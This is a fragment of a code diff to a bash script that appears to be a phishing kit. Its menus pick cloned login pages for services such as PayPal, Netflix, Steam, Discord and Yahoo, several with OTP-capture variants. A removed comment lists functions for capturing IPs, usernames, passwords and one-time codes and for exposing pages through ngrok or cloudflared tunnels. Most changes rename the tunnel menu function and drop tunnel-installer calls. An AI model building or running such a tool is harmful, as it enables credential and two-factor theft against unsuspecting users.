                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_microsoft; };;
@@ -1591,10 +1748,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="myspace"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="myspace/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_myspace; };;
@@ -1610,10 +1767,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="netflix"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="netflix/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_netflix; };;
@@ -1629,10 +1786,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="paypal"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="paypal/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_paypal; };;
@@ -1651,19 +1808,19 @@ case $choice in
         1 | 01)
                 website="paytm"
 		zipname="paytm"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="paytm/otp"
 		zipname="paytm"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="paytmoffer"
 		zipname="paytmoffer"
-                tunnel_menu;;
+                tunnelmenu;;
         4 | 04)
                 website="paytmoffer/otp"
 		zipname="paytmoffer"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_paytm; };;
@@ -1681,15 +1838,15 @@ case $choice in
         1 | 01)
                 website="playstation"
 		zipname="playstation"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="playstation/otp"
 		zipname="playstation"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="playstation2"
 		zipname="playstation2"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_playstation; };;
@@ -1705,10 +1862,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="protonmail"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="protonmail/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_protonmail; };;
@@ -1725,11 +1882,11 @@ case $choice in
         1 | 01)
                 website="reddit"
 		zipname="reddit"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="reddit_old"
 		zipname="reddit_old"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_reddit; };;
@@ -1745,10 +1902,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="shopify"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="shopify/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_shopify; };;
@@ -1764,10 +1921,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="snapchat"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="snapchat/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_snapchat; };;
@@ -1783,10 +1940,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="socialclub"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="socialclub/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_socialclub; };;
@@ -1802,10 +1959,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="spotify"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="spotify/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_spotify; };;
@@ -1821,10 +1978,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="stackoverflow"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="stackoverflow/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_stackoverflow; };;
@@ -1840,10 +1997,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="steam"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="steam/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_steam; };;
@@ -1861,15 +2018,15 @@ case $choice in
         1 | 01)
                 website="tiktok"
 		zipname="tiktok"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="tiktok_likes"
 		zipname="tiktok_likes"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="tiktok_likes/otp"
 		zipname="tiktok_likes"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_tiktok; };;
@@ -1887,15 +2044,15 @@ case $choice in
         1 | 01)
                 website="twitch"
 		zipname="twitch"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="twitch/otp"
 		zipname="twitch"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="twitch_new"
 		zipname="twitch_new"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_twitch; };;
@@ -1911,10 +2068,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="twitter"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="twitter/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_twitter; };;
@@ -1930,10 +2087,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="ubereats"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="ubereats/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_ubereats; };;
@@ -1949,10 +2106,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="verizon"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="verizon/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_verizon; };;
@@ -1970,15 +2127,15 @@ case $choice in
         1 | 01)
                 website="vk"
 		zipname="vk"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="vk/otp"
 		zipname="vk"
-                tunnel_menu;;
+                tunnelmenu;;
         3 | 03)
                 website="vk_poll"
 		zipname="vk_poll"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_vk; };;
@@ -1995,10 +2152,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="wordpress"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="wordpress/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_wordpress; };;
@@ -2014,10 +2171,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="xbox"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="xbox/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_xbox; };;
@@ -2033,10 +2190,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="yahoo"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="yahoo/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_yahoo; };;
@@ -2052,10 +2209,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="yandex"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="yandex/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_yandex; };;
@@ -2071,10 +2228,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="ytsubs"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="ytsubs/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_ytsubs; };;
@@ -2091,10 +2248,10 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="discord"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="discord/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_discord; };;
@@ -2110,43 +2267,15 @@ read -p "${MAGENTA} YOUR CHOICE : " choice
 case $choice in
         1 | 01)
                 website="jiorouter"
-                tunnel_menu;;
+                tunnelmenu;;
         2 | 02)
                 website="jiorouter/otp"
-                tunnel_menu;;
+                tunnelmenu;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_jiorouter; };;
 esac
 }
-##METHODS
-#--------#
-#banner
-#cbanner
-#sbanner
-#directories
-#dependencies
-#reset_colour
-#msg_exit
-#kill_pid
-#download_ngrok
-#download_cloudflared
-#install_ngrok
-#install_cloudflared
-#setup_site
-#start_ngrok
-#start_cloudflared
-#start_localhost
-#capture_ip
-#capture_data_check
-#capture_id
-#capture_pass
-#capture_otp
-#capture_data_1
-#capture_data_2
-#capure_data_3
-#mainmenu
-#tunnel_menu
 
 ##MAIN
 clear
@@ -2155,8 +2284,5 @@ directories
 kill_pid
 dependencies
 xpermission
-install_ngrok
-install_cloudflared
-install_localxpose
 clear
 mainmenu
